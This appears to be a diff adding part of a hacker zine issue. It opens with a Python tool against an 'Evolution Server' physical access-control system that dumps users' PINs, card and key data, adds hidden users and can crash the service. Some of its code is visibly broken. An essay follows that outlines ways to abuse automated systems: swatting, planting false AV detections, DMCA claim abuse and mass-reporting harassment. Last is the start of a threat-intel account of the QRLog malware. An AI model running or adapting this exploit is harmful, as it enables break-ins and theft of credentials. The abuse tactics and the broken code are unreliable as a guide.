+since it was last requested"
+
+def request_all_doors(host, port):
+    url = f'http://{host}:{port}/ID1_Device%20Doors'
+    headers = {
+        'Host': host,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) \
+Gecko/20100101 Firefox/66.0",
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,\
+image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        "Connection": "keep-alive"
+    }
+    response = requests.get(url, headers=headers)
+    response.close()
+    soup = BeautifulSoup(response.text, 'html.parser')
+   
+    # Check for session expiration or not logged in error response
+    script_tag = soup.find('script', string='opener.location="UnLoggedPage.html"')
+    if script_tag:
+        return "Error: Session appears to have expired, or user is not logged in."
+   
+    # Check if the holContainer table exists
+    hol_container = soup.find("table", {"id": "HolContainer"})
+    if hol_container:
+        rows = hol_container.find_all('tr', class_='CellsInDiv')
+        doors = []
+        for row in rows:
+            door_id = row['id']
+            cols = row.find_all('td')
+            location = cols[0].text.strip()
+            name = cols[1].text.strip()
+            doors.append((door_id, location, name))
+       
+        output = "\n\nDoors on System\n|ID|Location|Name|\n|---|---|---|"
+        for door in doors:
+            output += f"\n|{door[0]}|{door[1]}|{door[2]}|"
+        return output
+    else:
+        return "Error: Could not find the expected doors table in the response."
+
+def retrieve_site_name(host, port):
+    url = f'http://{host}:{port}/desktop'
+    headers = {
+        'Host': host,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) \
+Gecko/20100101 Firefox/66.0",
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,\
+image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        "Connection": "keep-alive"
+    }
+
+    response = requests.get(url, headers=headers)
+    response.close()
+    soup = BeautifulSoup(response.text, 'html.parser')
+   
+    title = soup.title.string  # Extract the content inside the <title> tag
+    return f"Site Name: {title}"
+
+def retrieve_company_fields(host, port):
+    url = f'http://{host}:{port}/ID_USER_GET_DATA_1'
+    headers = {
+        'Host': host,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) \
+Gecko/20100101 Firefox/66.0",
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,\
+image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        "Connection": "keep-alive"
+    }
+
+    response = requests.post(url, headers=headers)
+    response.close()
+    lines = response.text.strip().split('\n')
+   
+    if lines[0] == 'true':
+        company_names = lines[1:]
+        output = "\n|Index|Company Name|"
+        for index, name in enumerate(company_names):
+            output += f"\n|{index}|{name}|"
+        return output
+    else:
+        return f"\nNo company names found"
+
+def get_operator_names(host, port):
+    url = f'http://{host}:{port}/desktop_login.html'
+    headers = {
+        'Host': host,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) \
+Gecko/20100101 Firefox/66.0",
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,\
+image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        "Connection": "keep-alive"
+    }
+
+    response = requests.get(url, headers=headers)
+    response.close()
+    soup = BeautifulSoup(response.text, 'html.parser')
+
+    select_elem = soup.find('select', {'id': 'operatorname'})
+   
+    if not select_elem:
+        return "Error: Could not find the expected select element in the response."
+
+    options = select_elem.find_all('option')
+    markdown_table = "| ID | Username |\n|----|----------|\n"
+
+    for option in options:
+        markdown_table += f"| {option['value']} | {option.text} |\n"
+
+    return markdown_table
+
+def get_users(host, port):
+    url = f'http://{host}:{port}/MOBILE_GET_USERS_LIST'
+    headers = {
+        'Host': host,
+        'Connection': 'close'
+    }
+
+    current_index1 = 1
+    current_index2 = 1
+    collected_users = {}
+    max_same_responses = 75
+   
+    while True:  # Loop for current_index1
+        last_response1 = None
+        same_response_count1 = 0
+       
+        while True:  # Nested loop for current_index2
+            data = f'{current_index2}\r\n{current_index1}\r\n'
+            headers['Content-Length'] = str(len(data))
+           
+            print(f'Enumerating users; page {current_index2}/{current_index1}',end='\r')
+
+            with requests.Session() as session:
+                response = session.get(url, headers=headers, data=data.encode())
+           
+            # Check if this response (for index2) is the same as the last
+            if response.text == last_response1:
+                same_response_count1 += 1
+            else:
+                same_response_count1 = 0  # Reset the count
+                last_response1 = response.text  # Update the last response for index2
+               
+                lines = [line.replace('\r', '').strip() for line in response.text.split('\n')[3:]]
+                for i in range(0, len(lines) - 2, 3):  # ensure there's always a set of three
+                    user_name, user_color, user_index = lines[i], lines[i+1], lines[i+2]
+                    # Hiding instances where names are missing and user color is red
+                    if user_name and not (not user_name and user_color == "red"):
+                        if int(user_index) > 0 and user_index not in collected_users:
+                            collected_users[user_index] = (user_name, user_color, user_index)
+           
+            current_index2 += 1
+           
+            if same_response_count1 >= max_same_responses:
+                break  # Break the inner loop when reached max same responses for index2
+       
+        # Reset current_index2 and counters after exiting inner loop
+        current_index2 = 1
+        current_index1 += 1
+       
+        if current_index1 > max_same_responses:  # Ensure we don't go infinite
+            break
+   
+    def fetch_data(endpoint, user_index):
+        url = f'http://{host}:{port}{endpoint}'
+        data = f'1\r\n{user_index}\r\nget_code\r\n'
+        headers.update({'Content-Length': str(len(data))})
+       
+        with requests.Session() as session:
+            response = session.post(url, headers=headers, data=data.encode())
+        return response.text
+
+    def extract_data(response, regex):
+        match = re.search(regex, response)
+        return match.group(1) if match else ""
+
+    def fetch_key_data(endpoint, user_index):
+        url = f'http://{host}:{port}{endpoint}'
+        data = f'1\r\n{user_index}\r\nget_code\r\n'
+        headers.update({'Content-Length': str(len(data))})
+       
+        with requests.Session() as session:
+            response = session.post(url, headers=headers, data=data.encode())
+       
+        # Extract the key value
+        soup = BeautifulSoup(response.text, 'html.parser')
+        key_element = soup.find('input', {'id': 'key_card_id'})
+        return key_element['value'] if key_element and key_element.get('value') else '0'
+
+    def fetch_abacard_data(endpoint, user_index):
+        url = f'http://{host}:{port}{endpoint}'
+        data = f'1\r\n{user_index}\r\nget_code\r\n'
+        headers.update({'Content-Length': str(len(data))})
+       
+        with requests.Session() as session:
+            response = session.post(url, headers=headers, data=data.encode())
+       
+        # Extract the abacard value
+        soup = BeautifulSoup(response.text, 'html.parser')
+        abacard_element = soup.find('input', {'id': 'abacard_card_id'})
+        return abacard_element['value'] if abacard_element and abacard_element.get('value') else '0'
+
+    for user_index in collected_users:
+        # Get PIN
+        pin_response = fetch_data("/DESKTOP_EDIT_USER_GET_PIN_FIELDS", user_index)
+        pin_value = extract_data(pin_response, r'value="(\d+)" name="loc_form_user_pin"')
+       
+        # Get Card Fields
+        card_response = fetch_data("/DESKTOP_EDIT_USER_GET_CARD_FIELDS", user_index)
+        site_code_value = extract_data(card_response, 
+                           r'value="(\d+)" SELECTED')
+        card_data_value = extract_data(card_response, 
+                           r'value="(\d+)" name="loc_form_user_card"')
+
+        key_value = fetch_key_data("/DESKTOP_EDIT_USER_GET_KEYS_FIELDS", 
+                     user_index)
+        abacard_value = fetch_abacard_data("/DESKTOP_EDIT_USER_GET_ABACARD_FIELDS", 
+                         user_index)
+
+        collected_users[user_index] += (pin_value, site_code_value, card_data_value, 
+                                        key_value, abacard_value)
+
+    blue_users = []
+    red_users = []
+    black_users = []
+
+    # Categorize users based on Color
+    for user_index in collected_users:
+        user_data = collected_users[user_index]
+        if user_data[1].lower() == 'blue':
+            blue_users.append(user_data)
+        elif user_data[1].lower() == 'red':
+            red_users.append(user_data)
+            black_users.append(user_data)
+        elif user_data[1].lower() == 'black':
+
+    def generate_table(users, title):
+        table = f"{title}\n| User Index | Name | Color | PIN | 
+        table += f"Site Code/Facility Code | Card Data | Silcakey | AbaCard |\n"
+        table += f"|------------|------|-------|-----|-----------|-----------|-----|--------|\n"
+        for entry in sorted(users, key=lambda x: int(x[2])):
+            table += f"| {entry[2]} | {entry[0]} | {entry[1]} | {entry[3]} "
+            table += f"| {entry[4]} | {entry[5]} | {entry[6]} | {entry[7]} |\n"
+        return table + "\n"
+
+    # Generate tables for each color category
+    blue_table = generate_table(blue_users, "\n## Users with Access")
+    red_table = generate_table(red_users, "\n## Users with revoked access")
+    black_table = generate_table(black_users, "\n## Non-Access Users")
+
+    return blue_table + red_table + black_table
+
+def add_user(host, port, card_number, site_id, username, invisible):
+    url = f'http://{host}:{port}/USER_CHANGE'
+    headers = {
+        'Host': host,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) \
+Gecko/20100101 Firefox/66.0",
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,\
+image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        "Connection": "keep-alive"
+    }
+
+    data = {
+        'user_operator_id': '0' if invisible else '1',
+        'user_id': '0',
+        'user_name': username,
+        '1': 'on',
+        'loc_form_user_card_imptrinted': card_number,
+        'loc_form_user_als_sitecode': site_id,
+        'loc_form_user_als_sitecode_new': site_id,
+        'loc_form_user_card': card_number,
+        'loc_form_user_data1': '',
+        'loc_form_user_data2': '',
+        'command': ''
+    }
+   
+    response = requests.post(url, headers=headers, data=data)
+    return("Completed adding user")
+
+# Update the main function to test the new function:
+def main():
+    parser = argparse.ArgumentParser(description="Interact with Evolution Server.")
+    parser.add_argument("--host", help="Target host (IP address)")
+    parser.add_argument("--port", type=int, help="Target port")
+    parser.add_argument("--crash", action="store_true", help="Crash the application")
+    parser.add_argument("--add-user", action="store_true", help="Flag to add a new user")
+    parser.add_argument("--username", type=str, help="Username for adding user")
+    parser.add_argument("--site-id", type=str, help="Site ID for adding user")
+    parser.add_argument("--card-number", type=str, help="Card number for adding user")
+    parser.add_argument("--invisible", action="store_true", help="Make the user invisible")
+
+    args = parser.parse_args()
+
+    host = (args.host)
+    port = (args.port)
+
+    if args.add_user:
+        if not all([args.card_number, args.site_id, args.username]):
+            print("Error: When adding a user, --card-number, --site-id, and --username are required.")
+            exit(1)
+       
+        print(add_user(host, port, args.card_number, args.site_id, args.username, args.invisible))
+    if args.crash:
+        print(application_crash(host, port))
+    if not(args.crash):
+        print(retrieve_site_name(host, port))
+        print(get_operator_names(host, port))
+        print(retrieve_company_fields(host, port))
+        print(return_last_scanned_card(host, port))
+        print(get_users(host, port))
+        #print(request_all_users(host, port))
+        #print(request_all_doors(host, port))
+
+if __name__ == '__main__':
+    main()
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 3 - The Weaponization of Automation ]=-----------------------------=|
+|=-----------------------------------------------------------------------=|
+
+by Xenon Hexafluoride
+
+These days when folks hear automation they think AI. All the discussion these
+days is around “How I tricked an AI bot into selling me a car for a dollar”,
+and “I got DALL-E to spit out goatee when they tried to train it on my
+artwork”. These are fun and righteous hacks. But the reality is that a lot
+of the dangerous and unethical shit predates AI. Automation has existed long
+before AI. It was ML, expert systems, runbooks, mechanical turks, etc. long
+before all the buzzwords kicked in. And, when a system exists long enough,
+folks other than curious hackers will start attacking it to hurt others,
+make money, or both.
+
+I’m not going to dig into the minutiae of AI poisoning, because as you dear
+readers well know, the old attacks still work. We’re going to get into how
+groups today are still leveraging attacks on pre-existing automation and how
+reliance on AI will just make the problem worse.
+
+Swatting
+It seems appropriate to start with the confluence of old school phreaking,
+law enforcement basically being mechanical turks, and bigoted assholes on
+the internet.
+
+Swatting has been around a long time, starting with random folks that tea-
+bagged the wrong person in Halo or Brian Krebs. And once we’re done laughing
+about Krebs, no friend to hackers, having his house surrounded by gunmen,
+remember that at least one of them was hell bent on killing any dog they
+saw. But how could such a bastion of the law and computer ethics be subject
+to such indignity?
+
+He tried to avoid this. The local PD listened to his concerns, wrote down
+that if they get a panicked call from his house that sets off the SWAT
+response runbook, they should call back first to double check.
+
+Best they could do was call twice while he was running a vacuum and not use
+common sense before the runbook kicked off. So he had multiple guns pointed
+at him. There wasn’t a page in the runbook for actually responding to a
+likely hoax, so they had to respond not knowing that. The icing on the cake
+is that the runbook breaks down again on actually detaining someone, so you
+get officers giving conflicting orders. He’s lucky to be alive, and no one
+from the police would have gotten in trouble if he wasn’t.
+
+More recent incidents involving politicians and judges all are ending in
+local LE actually updating their runbooks for folks under federal
+protection. Not so much for the rest of us. There are starting to be more
+fatalities without law enforcement themselves taking responsibility (as
+always deflecting to anyone but themselves for blame). And as law
+enforcement embraces AI as a way to launder their own biases, bigotry and
+hatred of due process, we’re heading for a future where instead of TSA
+giving you a hard time because a computer said so, a bunch of armed men
+looking for a fight will show up to your house because a computer told them
+to.
+
+AV and other Signature/AI Based Detection
+Systems that automatically detect “malicious” behavior and block it are
+inherently weaponizable. They typically run with a high degree of privilege
+or on the critical path and are often deployed to block first and figure out
+what happened later. Even in the cases where they run out of band, they can
+randomize the security team and provide a smokescreen for real attacks by
+either forcing an expensive response process or exhausting resources.
+
+Most of these attacks will start from convincing the security software to
+have a false positive detection on something. In some cases this is as
+simple as submitting a sample with the desired characteristics or behaviors
+via an anonymous channel, but if you convince someone in security or IT to
+send it into their vendor support rep you can bypass a lot of internal
+safeguards against these attacks. Another way to get around safeguards at a
+target vendor is to leverage the fact many of these companies are graded
+against each other and therefore are forced by sales and marketing to give
+far more credence to competitor detections. Virus Total and many IP/URL
+rep services are great places to start. For network traffic, the ET Open
+signature set, especially with a lot of “malicious” pcaps posted will likely
+end up absorbed into other vendor detection sets before the FPs are known.
+And some of the anti-spam providers operate on a hair trigger without too
+much work.
+
+A few more concrete examples: For URL reputation, it is often just
+anonymous reporting or IT reporting of the URLs, as mentioned above, to low
+hanging fruit public databases that do minimal verification. After a few of
+those submissions, attackers can start working up the provider reputation
+ladder with reports. For low prevalence files like an unsigned line of
+business application or a small competitor, the more common attack is
+submitting variants of known malicious droppers updated to also drop a copy
+of the target program to VirusTotal. At this point the attacker is just
+waiting for enough vendors to detect the sample so that “me too” signing is
+triggered by aforementioned sales and marketing requirements. In other cases
+attacks might require blending features of known malware or malicious
+traffic with the features of what you want to induce an FP on (e.g. C2
+traffic with similar characteristics to Epic Medical Software, emails with
+clear phishing links that are otherwise identical to a security alert an
+attacker wants to hide, or resigning a file with a suspicious code sign
+cert.)
+
+While many of these techniques are frequently used to blend into the
+background, using the vendor fear of FP to avoid detection, causing the FP
+can also be the objective. Which FP or FPs are induced in the target
+software/ecosystem and how the samples are initially fed into the automation
+pipeline will depend on ultimate goal and underlying systems actually being
+attacked. The attacks can be pure denial of service (e.g. taking down a
+bank’s in house ACH software), repetitional attacks on a security vendor to
+reduce trust (either for a future attack on someone using their software or
+a competitor), repetitional attacks against competitors using security
+vendors as weapons directly, or even as a resource exhaustion attack on the
+security team at a target.
+
+Although some of these, like intentional denial of service on critical
+systems remain theoretical, I’ve seen, often firsthand, the use of the
+simple report and wait URL and file reputation attacks between competing
+companies. And then there was the one time a grumpy Russian oligarch
+decided his AV competitors were “stealing” from him. Even though he helped
+create the entire ecosystem of sales and marketing driven AV testing that
+made “me too” detections table stakes.
+
+The Kaspersky attacks used knowledge of how AV engines internally break
+files into features to inject features common across a variety of malicious
+samples, leaving the automation only the clean snippets to differentiate
+from other generic detections. If this sounds a lot like an AI poisoning
+attack before it’s time, that’s because at its core that’s what it is.
+Around the same time hackers were just throwing the first 256 bytes into
+the .rsrc sections of PE files for the lulz; a much less sophisticated attack.
+In the end Kaspersky did themselves more harm than good by getting caught. [3]
+And yet all the involved companies agreed to just blame hackers. [4]
+
+Automated Copyright Enforcement Moving on to content creation, we hit the
+nexus of corporate profits for the company responsible for in theory being a
+“good faith” broker and corporations that want to loot as much money as they
+can. Compared to other attacks in this article, this one is straightforward
+because it relies on companies maximizing profit and the gift that keeps on
+giving headaches to hackers, creators, and basically anyone that isn’t a
+corporate lawyer, the DMCA.
+
+Youtube’s ContentID and other platforms with automated enforcement built in
+have long had issues with fair use [5] but generally fair use is infrequent
+enough that when it’s flagged by a platform or a notorious copyright troll
+with automation like Sony BMG, the dispute process can keep up. It still
+sucks, but most of the content hosts are reasonable about fair use because
+it started impacting their own bottom line (loss of content elsewhere and
+legal fees if the fair use was also a deep pocketed corporation). It still
+sucks, but it won’t get better until the laws or financial incentives
+change.
+
+The more recent DMCA abuse involves leveraging these same automated systems
+to steal credit from artists and other creators. The attack is making just
+enough original music to be considered slightly legit by a troll company
+like Sony BMG or “The Orchard”, then claiming music that is not claimed
+yet. In some cases, this is just to use ContentID etc. to get ad revenue
+from an artist that isn’t trying to monetize their work. Generally, the  
+artist's apathy means they don’t notice someone has claimed their work…
+That is until they tell other creators that like it’s totally cool to use
+their music for free and it ends up in monetized videos from creators that
+do care about their revenue. The attacker and their corporate facilitators
+then mass report the videos with the newly claimed music and cash in while
+the dispute process takes place.
+
+The reasons these work so well are two-fold. There is no good way to
+register public domain music/content, and definitely no incentive for either
+the trolls or platforms to do it. The second is the DMCA flagging/reporting
+process is easy and allows for mass reporting, but as mentioned above, really
+difficult to resolve and usually cannot automatically resolve unless the
+original rights holder (not the impacted creators) sues the troll directly.
+So 30 minutes per video sucks for fair use, but 30 minutes for a catalog of
+hundreds of videos is a nightmare and difficult to dig out from. And since
+the original rights holder still can’t really claim the work, a different
+attacker and helpful troll company are free to do it again in the future.
+
+There is also a new variation on this attack just starting up where AI is
+used to rip off someone else’s content, then the folks doing bulk AI
+rip-offs use DMCA and the backing automation to claim copyright infringement
+against the original.
+
+From content moderation of generalized online assholes on both sides of the
+political spectrum (or neither) to more organized and targeted groups like
+Kiwifarms, automated content moderation has been abused to de-platform or
+demonetize targets for nearly as long as it has existed. And yet from the
+days before 4chan to today, even as the underlying automation has changed,
+the same attacks still work. Keyword lists never went away as the first
+tier, they just have weights now. The second tier hit by mass reporting is
+more likely an LLM instead of someone underpaid in a windowless room with
+a binder and poor English skills (i.e. mechanical turks). And at the top tier
+is a human that can at least think as much as the lawyers allow, if you
+somehow actually manage to escalate to them.
+
+The same attacks still work because of both inherent issues with the system
+design of how automation is used, and a high disparity between attacker and
+victim. The usual attack will either mine historical posts of a target user
+or start a harassment campaign against them. Once they find or elicit a
+response that they know will get sufficiently flagged by one of the first two
+tiers of automation, they and their friends all mass report the target. Some
+of the responses that will generally meet this criteria are typically
+responding to dog whistles with actual slurs, non-serious threats of
+violence or self harm, or far too often, just reposting harassing messages
+that should trigger the automation, but ether come from a wave of disposable
+accounts or only do so when mass reported.
+
+The companies either can’t or won’t pay for improved human mitigation for
+these attacks, either for financial reasons, or a fundamental naive belief
+that bad faith behavior is either not their problem or something automation
+can handle. Add in the additional disparity/asymmetry problems of an
+individual against a group, standards around acceptable speech generally
+disfavoring minority groups, and the consequences for some being a loss of
+support or income for the target. Attackers can make dummy accounts for
+actionable harassment while sticking to dog whistles on their primary
+accounts, while targets frequently rely on just one account.
+
+More unsettling is some of the context coming out of an attack that normally
+would only be in the realm of the US Military: deploying $44 billion to
+destroy something. Elon’s takeover of Twitter has shown what bad faith
+content moderation looks like when the government isn’t already running a
+censorship regime (e.g. TikTok). It raises questions about some of
+the decisions at other big corporations, especially Facebook. In the days
+of 4chan, it was just folks on the internet who, in hacker fashion, figured
+out the systems better than the folks that wrote or maintained them. But
+since then, Google had a bunch of pro-James Damore employees dox his
+internal critics publicly. To what extent they and folks like them are
+sharing details of moderation systems or actively sabotaging them to
+facilitate harassment we can’t be sure.
+
+The actual danger of AI isn’t necessarily the technology itself, but how it
+is used. It doesn’t mitigate the old attacks using automation, it amplifies
+them. In some cases, it’s adding a level of certainty to automation systems
+by virtue of being harder to understand, not actually earning that trust in
+many of the fields it’s being deployed. That same complexity also makes
+both external poisoning attacks, but also intentional incorporation of bias
+harder to detect and mitigate. Finally, by being so obtuse yet so
+unreasonably trusted, it further removes responsibility from people
+knowingly operating insecure systems so they can blame everyone but
+themselves: the AI, the targets, and whenever they can find an excuse,
+hackers.
+
+
+[1] — https://arstechnica.com/information-technology/2013/03/security-
+    reporter-tells-ars-about-hacked-911-call-that-sent-swat-team-to-his-house/
+[2] — https://www.justice.gov/usao-ks/pr/ohio-gamer-pleads-guilty-swatting-
+    caused-death
+[3] — https://www.reuters.com/article/2015/08/14/us-kaspersky-rivals-
+    idUSKCN0QJ1CR20150814/
+[4] — Propellerheads - History Repeating.
+[5] — https://www.eff.org/deeplinks/2016/05/dear-sony-not-fee-use-fair-use
+
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 4 - Riding with the Chollimas: Our 100 day quest to     ]=---------=|
+|=-=[     profile a North Korean State-Sponsored Threat Actor ]=---------=|
+|=-----------------------------------------------------------------------=|
+
+by MauroEldritch <Quetzal Team>
+
+
+[Table of contents]
+
+0) About: Eldritchs, Quetzals, Chollimas
+1) Introduction: A warm February morning in Uruguay
+2) The infection
+3) A Digital Molotov: Analyzing a homemade malware
+4) IOCs, CTI, Snitches & Stitches
+5) Winged horses, corpo espionage and ballistic missiles
+6) OPSEC Fail
+7) Outro: February again
+8) Acknowledgments
+9) References
+
+-- 
+
+0) [About: Eldritchs, Quetzals, Chollimas]
+
+About the Author
+
+  Mauro Eldritch is an Argentine-Uruguayan hacker, founder of BCA LTD and 
+  DC5411 (Argentina / Uruguay). He spoke at different events including 
+  DEF CON a couple of times in the past. Loves Threat Intelligence and 
+  Biohacking, and is part of the Quetzal Team.
+
+About the Quetzal Team
+
+  Quetzal is Bitso's Web3 Threat Research Team. Our focus and commitment 
+  are to deliver high-quality threat intelligence reports on advanced 
+  persistent threats (APTs) and state-sponsored threats targeting the 
+  crypto space.
+
+  In the past, we have successfully confronted organized cybercrime 
+  operations carried out by Fancy Lazarus (RansomDDoS), Lazarus (Labyrinth
+  & Velvet Chollimas), and EVILNUM (Mercenary Group). Also, Quetzals are 
+  majestic green birds present in Central and North America.
+
+About the Chollimas
+
+  A Chollima (or Qianlima or Senrima) is a mythical winged horse present 
+  in Eastern Asian mythology, which inspired important political movements
+  like the North Korean Chollima Movement. 
+
+  It is also the alias used by CrowdStrike for North Korean Threat Actors. 
+  These are state-sponsored actors who are backed financially and legally
+  by their government, allowing them legal impunity and significant 
+  budgets. This ultimately result in reckless attacks against other
+  governments (Op DarkSeoul), corporations (Sony, Bangladesh Bank), crypto 
+  protocols and bridges (Ronin & Horizon bridges), or just globally (like 
+  the WannaCry outbreak). 
+
+  Sometimes, these reckless attacks experience "drawbacks" and end up like
+  a fun story rather than a tragedy. Luckily this is one of those stories.
+
+-- 
+
+[Introduction: A warm February morning in Uruguay]
+
+Note: All times expressed in GMT (for reference, Uruguay is GMT-3, Mexico 
+GMT-6). The year is 2023.
+
+February, 7th.
+> 12:00.
+
+It was a warm February morning in Uruguay. It was early for me, and even 
+earlier for the rest of my team who were living three hours behind in 
+Mexico. The first thing in the morning, an EDR alert hit me, and I stumbled 
+upon an unusual malware sample that seemed quite homemade. 
+
+Surprisingly simple, it evaded all existing antivirus software and was only 
+detected and blocked by heuristics. Thus, I deemed it worthy of further 
+investigation. After conducting the usual CTI and OSINT routine, things 
+took a much darker turn... Almost 100 days later, we decided to team up 
+with Juan Brodersen, a journalist and my friend. 
+
+And so, our journey to profile the malware developers (and their campaign) 
+began. But let's tell this tale from the start, and go back to that warm 
+February morning in Uruguay when I met the Chollimas for the first - and 
+certainly not the last - time.
+
+-- 
+
+2) [The infection]
+
+February, 7th. That warm morning.
+> 12:25.
+
+An unknown malware was detected on an engineer's laptop, bundled inside 
+a fake Java QR Generator.
+
+> 12:25 - 13:01
+
+The artifact was sandboxed. The affected host was network contained and 
+multiple alerts from Crowdstrike Falcon were issued.
+
+> 13:01
+
+The artifact was seized after preventing it from self-deleting. We started 
+monitoring its behavior and extracting IOCs. It looked plain simple, like 
+those things that cannot fail just due to its simplicity, but I'm not one 
+to judge a book solely by its cover. And hell, I was right.
+
+-- 
+
+3) [Digital Molotov: Analyzing a homemade malware]
+
+February, 7th. That warm morning.
+> 15:00
+
+  "This is a basic - seemingly homemade - RAT that attempts to open a 
+  reverse shell. As of the time of writing, there is no public mention 
+  of this malware or its components. I named it QRLOG."
+
+    - My first report on the sample from now on, QRLog.
+
+QRLog was surprisingly simple, working as an implant inside a functioning 
+QR Generator project and hiding its malicious payload in plain sight 
+within a base64 encoded variable named QUIET_ZONE_DATA. This variable 
+was written to a temporary .java file. Upon execution, it would open a 
+reverse shell for the adversary to *manually* abuse the system. 
+
+And that's it. No fancy UAC bypass, kernel extensions, or 0-days that 
+didn't make its way to the proper exploit broker were used. Just plain 
+Java code encoded in base64 against all odds. That simplicity eluded 
+*all* antivirus detections on VirusTotal, but luckily its behavior was 
+noisy enough for Falcon's heuristics to raise a brow and a set of alerts 
+against it.
+
+While reviewing the code, I noticed numerous indications of its homemade 
+origin. These included various instances of bad practices and 
+carelessness: unnecessary imports, poorly written functions attempting 
+to identify the OS, a custom function for generating random strings 
+despite importing libraries for that purpose, hardcoded paths, and even 
+a hardcoded Command and Control (C2) server address.
+
+I couldn't believe that such a simple piece of code could bypass antivirus
+with just mud and sticks. So, I asked Maximiliano Firtman, a Java expert, 
+programmer, and professor, what he thought of the code. He shared: 
+
+  "It is the code of someone who does not have much experience and was 
+  copying and pasting things from the Internet. It appears as though 
+  someone created a script for hacking their girlfriend."
+
+This led us to compare QRLog to a "digital molotov": simple, but 
+destructive.
+
+February, 9th. 2 warm mornings later.
+> 12:07
+
+QRLog was my very first malware analysis, so I thought it was a good 
+warm-up for what could - eventually - come next in my career: an easy 
+start. I wrapped up everything I found and published the IOCs as an 
+intelligence pulse in AlienVault OTX, along with a write-up about the 
+analysis on my Github profile. 
+
+Just like the code itself, the indicators didn't quite catch the eye: 
+SSL certificates issued by Let's Encrypt, some cheap VPS instances, and 
+the aforementioned C2 server, which seemed to be recycled. 
+
+The C2 was associated with almost 500 other domains and had a rather 
+tarnished reputation on different intel platforms, as it took 
+part in many malicious campaigns in the past. These include Log4J, 
+JokerSpy, hosting Cobalt Strike, among others. 
+
+There wasn't much more to tell. The CTI session came to an end, and 
+I wanted to focus on other matters... But it didn't last long. 
+
+--
+
+4) [IOCs, CTI, Snitches & Stitches]
+
+April, 26th. 79 mornings later. Some warm, some not so much.
+> 08:44
+
+I received a DM on Twitter regarding my publication on Github: A friendly
+researcher wanted to contact me on a secure platform to share something 
+important about one of my IOCs. We went over Tox, where he told me:
+
+  "Just out of curiosity, were you aware that what you were looking at 
+  was malware from a North Korean threat actor?"
+
+I was frozen in place. After discussing the matter for a bit, and with 
+his permission, we moved on to share this intel with Crowdstrike to 
+confirm attribution. We also shared information with my journalist 
+friend Juan to collaborate on this story. Revisiting my notes once again,
+I noticed their C2 was still up and running... so I thought, "why not?"
+
+> 09:30
+
+After reviewing QRLog's interaction with its C2 server, we found a way to
+submit a crafted message which will surely be read by the TAs. With 
+journalistic purposes, we started flooding their server with an invite 
+to talk on Telegram, sharing my alias in hopes to get "the interview". 
+But I think people send friendship requests in a different way in 
+North Korea...
+
+> 10:28
+
+We observed hundreds - which then became more than a thousand - attempts to
+brute-force an SSH instance running on the machine from where the original
+contact request was sent. Unbeknownst to the TAs, that VPS served 
+involuntarily as a honeypot, and provided us with even more valuable 
+intel on their infra. These attacks went on for days, but since we were 
+collecting their data, the longer we endured, the better. After all...
+snitches get stitches.
+
+
+April, 28th. 81 mornings later. On a particularly rainy one.
+> 13:36
+
+Crowdstrike wrote back, confirming attribution with High confidence to
+Labyrinth Chollima, a division from the infamous Lazarus group, and part 
+of the DPRK RGB (Reconnaissance General Bureau).
+
+
+May, 2nd. 85 mornings later. On a particularly chilly one.
+> 16:10
+
+The C2 server went down for good. The attacks stopped. More than 1500 brute
+force attempts were received from all around the world. Many IPs belonged 
+to lesser known VPS providers, while others belonged to big players like 
+AWS.
+
+Onboarding Juan was a good decision, as he managed to get a word with 
+AWS CISO, Mark Ryland. He expressed his concern that while "hackers are 
+willing to pay for [our service]", "there are more sophisticated actors 
+that abuse AWS".
+
+From my side, I began classifying and packaging all the new intel to 
+publish it as a pulse once again on AlienVault OTX. It was at that point
+where we wanted to know everything about them. But as they say, curiosity
+killed the cat.
+
+-- 
+
+5) [Winged horses, corpo espionage and ballistic missiles]
+
+May, 10. 93 mornings later. On a depressingly frosty day.
+> Around 13:00
+
+Juan began communicating with PR departments at different security firms
+about what they knew. None of them had seen the sample before, and we 
+were the very first to publish anything about it, and its surrounding 
+espionage campaign.
+
+Slowly, we pieced together the puzzle of the North Korean threat landscape,
+connecting names and heists, learning about the separation between "common"
+divisions within Lazarus, like Labyrinth Chollima, Stardust Chollima, and 
+Silent Chollima, which carried out espionage and crypto theft operations 
+targeting giants like Sony or AstraZeneca. 
+
+We also learned about "more sophisticated" or even (as some vendors call 
+them) "elite" divisions like Velvet and Ricochet Chollima, responsible 
+for targeting the Korean Hydro Nuclear Power Plant in 2014 and the Daily 
+NK, one of Korea's largest media outlets, in 2023. 
+
+All of these divisions seemingly had a common objective: to conduct 
+economic espionage and theft for their state. Ultimately, these funds 
+were put to an even darker fate: to fund North Korea's ballistic program.
+
+  "[...] stolen assets are likely funding an array of state projects 
+  including North Korea's nuclear and WMD programs."
+
+    - Crowdstrike Intelligence report on Labyrinth Chollima. 2023.
+
+  "Cyberwarfare is an all-purpose sword that guarantees the North Korean 
+  People's Armed Forces ruthless striking capabilities, along with nuclear 
+  weapons and missiles"
+
+  - Kim Jong-un. 2013. This speech was quoted by HC3 & CISA.
+
+  "Treasury is taking action against North Korean hacking groups that have
+  been perpetrating cyber attacks to support illicit weapon and missile 
+  programs" 
+
+    - Sigal Mandelker, Treasury Under Secretary for Terrorism and Financial
+      Intelligence. 2019.
+
